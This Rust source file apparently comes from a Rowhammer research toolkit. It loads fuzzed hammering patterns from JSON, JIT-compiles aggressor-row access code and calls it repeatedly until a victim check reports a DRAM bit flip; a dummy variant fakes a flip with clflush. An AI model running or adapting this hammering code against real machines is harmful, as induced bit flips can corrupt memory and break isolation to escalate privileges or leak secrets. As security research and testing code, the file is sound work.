use anyhow::{bail, Context, Result};
use rand::Rng;
use serde::Deserialize;
use serde_with::serde_as;
use std::arch::x86_64::_mm_clflush;
use std::fmt::Debug;
use std::time::SystemTime;
use std::{collections::HashMap, fs::File, io::BufReader};

use crate::jitter::{AggressorPtr, CodeJitter, Jitter, Program};
use crate::memory::DRAMAddr;
use crate::util::MemConfiguration;

pub trait Hammering {
    fn hammer(&self, victim: &mut dyn HammerVictim) -> Result<HammerResult>;
}

#[derive(Deserialize, Debug, Hash, PartialEq, Eq, Clone)]
struct Aggressor(u64);

#[derive(Deserialize, Debug, Clone)]
struct AggressorAccessPattern {
    frequency: usize,
    amplitude: i32,
    start_offset: usize,
    aggressors: Vec<Aggressor>,
}

#[derive(Deserialize, Debug, Clone)]
struct BitFlip {
    dram_addr: DRAMAddr,
    bitmask: u8,
    data: u8,
}

#[serde_as]
#[derive(Deserialize, Debug, Clone)]
struct PatternAddressMapper {
    id: String,
    min_row: usize,
    max_row: usize,
    bank_no: usize,
    #[serde_as(as = "Vec<(_, _)>")]
    aggressor_to_addr: HashMap<Aggressor, DRAMAddr>,
    bit_flips: Vec<Vec<BitFlip>>,
    code_jitter: CodeJitter,
}

impl PatternAddressMapper {
    fn get_hammering_addresses(
        &self,
        aggressors: &Vec<Aggressor>,
        base_msb: AggressorPtr,
        mem_config: MemConfiguration,
    ) -> Vec<AggressorPtr> {
        aggressors
            .iter()
            .map(|agg| self.aggressor_to_addr[agg].to_virt(base_msb, mem_config))
            .collect()
    }

    fn get_random_nonaccessed_rows(
        &self,
        base_msb: AggressorPtr,
        mem_config: MemConfiguration,
    ) -> Vec<AggressorPtr> {
        let mut addresses = vec![];
        let mut rng = rand::thread_rng();
        for _ in 0..1024 {
            let row = rng.gen_range(self.max_row..self.max_row + self.min_row)
                % mem_config.get_row_count();
            addresses.push(DRAMAddr::new(self.bank_no, row, 0).to_virt(base_msb, mem_config));
        }
        addresses
    }
}

#[derive(Deserialize, Debug)]
struct FuzzSummary {
    hammering_patterns: Vec<HammeringPattern>,
}

#[derive(Deserialize, Debug, Clone)]
struct HammeringPattern {
    id: String,
    base_period: i32,
    max_period: usize,
    total_activations: u32,
    num_refresh_intervals: u32,
    is_location_dependent: bool,
    access_ids: Vec<Aggressor>,
    agg_access_patterns: Vec<AggressorAccessPattern>,
    address_mappings: Vec<PatternAddressMapper>,
    //code_jitter: CodeJitter,
}

impl HammeringPattern {
    fn determine_most_effective_mapping(&mut self) -> Option<PatternAddressMapper> {
        self.address_mappings
            .iter_mut()
            .max_by_key(|m| m.bit_flips.len())
            .cloned()
    }
}

pub struct HammerResult {
    pub run: u64,
    pub attempt: u64,
}

pub trait HammerVictim: Debug {
    fn init(&mut self) {}
    /// returns true if flip was successful
    fn check(&mut self) -> bool;
    fn log_report(&self) {}
}

pub struct DummyHammerer {
    base_msb: *mut u8,
    flip_offset: usize,
}

impl DummyHammerer {
    pub fn new(base_msb: *mut u8, flip_offset: usize) -> Self {
        DummyHammerer {
            base_msb,
            flip_offset,
        }
    }
}

impl Hammering for DummyHammerer {
    fn hammer(&self, victim: &mut dyn HammerVictim) -> Result<HammerResult> {
        victim.init();
        unsafe {
            let flipped_byte = self.base_msb.add(self.flip_offset);
            debug!(
                "Flip 0x{:02X} from {} to {} at offset {}",
                flipped_byte as usize, *flipped_byte, !*flipped_byte, self.flip_offset
            );
            *flipped_byte = !*flipped_byte;
            _mm_clflush(flipped_byte);
        }
        let result = victim.check();
        if result {
            return Ok(HammerResult { run: 0, attempt: 0 });
        }
        bail!("No success")
    }
}

pub struct Hammerer {
    base_msb: *const u8,
    mem_config: MemConfiguration,
    mapping: PatternAddressMapper,
    program: Program,
}

impl Hammerer {
    pub fn new(
        mem_config: MemConfiguration,
        json_filename: String,
        pattern_id: String,
        base_msb: AggressorPtr,
    ) -> Result<Self> {
        // load patterns from JSON
        let mut pattern = load_pattern_from_json(json_filename, pattern_id)?;

        let mapping: &mut PatternAddressMapper = &mut pattern
            .determine_most_effective_mapping()
            .with_context(|| "pattern contains no mappings")?;

        info!("Determined most effective mapping.");
        /*for victim in &mapping.victim_rows {
            info!(
                "Found expected victim row {:?}",
                DRAMAddr::from_virt((*victim) as *const u8, &mem_config),
            )
        }*/

        let hammer_log_cb = |action: &str, addr| {
            debug!(
                "{} 0x{:016X} ({})",
                action,
                addr as usize,
                DRAMAddr::from_virt(addr, &mem_config)
            );
        };

        let hammering_addrs =
            mapping.get_hammering_addresses(&pattern.access_ids, base_msb, mem_config);
        drop(pattern.access_ids);

        let acts_per_tref = pattern.total_activations / pattern.num_refresh_intervals;

        let program =
            mapping
                .code_jitter
                .jit(acts_per_tref as u64, &hammering_addrs, &hammer_log_cb)?;
        program
            .write("hammer_jit.o")
            .with_context(|| "failed to write function to disk")?;

        return Ok(Hammerer {
            base_msb,
            program,
            mem_config,
            mapping: mapping.clone(),
        });
    }

    fn do_random_accesses(
        &self,
        rows: &[AggressorPtr],
        wait_until_start_hammering_us: u128,
    ) -> Result<()> {
        let start = SystemTime::now();
        while SystemTime::now()
            .duration_since(start)
            .with_context(|| "time went backwards")?
            .as_micros()
            < wait_until_start_hammering_us
        {
            for row in rows {
                let _ = unsafe { std::ptr::read_volatile(row) };
            }
        }
        Ok(())
    }
}

impl Hammering for Hammerer {
    fn hammer(&self, victim: &mut dyn HammerVictim) -> Result<HammerResult> {
        let num_retries = 100;
        let num_runs = u64::MAX;
        let mut rng = rand::thread_rng();
        const REF_INTERVAL_LEN_US: f32 = 7.8; // check if can be derived from pattern?

        for run in 0..num_runs {
            victim.init();
            info!("Hammering run {}", run);
            for attempt in 0..num_retries {
                let wait_until_start_hammering_refs = rng.gen_range(10..128); // range 10..128 is hard-coded in FuzzingParameterSet
                let wait_until_start_hammering_us =
                    wait_until_start_hammering_refs as f32 * REF_INTERVAL_LEN_US;
                let random_rows = self
                    .mapping
                    .get_random_nonaccessed_rows(self.base_msb, self.mem_config);
                debug!(
                    "do random memory accesses for {} us before running jitted code",
                    wait_until_start_hammering_us as u128
                );
                self.do_random_accesses(&random_rows, wait_until_start_hammering_us as u128)?;
                debug!("call into jitted program");
                let result = unsafe { self.program.call() };
                debug!(
                    "jit call done: 0x{:02X} (attempt {}:{})",
                    result, run, attempt
                );
                let result = victim.check();
                if result {
                    return Ok(HammerResult { run, attempt });
                }
            }
        }
        bail!("No success")
    }
}

/// Load patterns from a file, filtering for given pattern_ids
fn load_pattern_from_json(json_filename: String, pattern_id: String) -> Result<HammeringPattern> {
    let f = File::open(&json_filename)?;
    let reader = BufReader::new(f);
    let patterns: FuzzSummary = serde_json::from_reader(reader)?;
    Ok(patterns
        .hammering_patterns
        .into_iter()
        .find(|p| pattern_id.eq(&p.id))
        .with_context(|| {
            format!(
                "did not find pattern with id {} in {}",
                pattern_id.clone(),
                json_filename
            )
        })?)
}
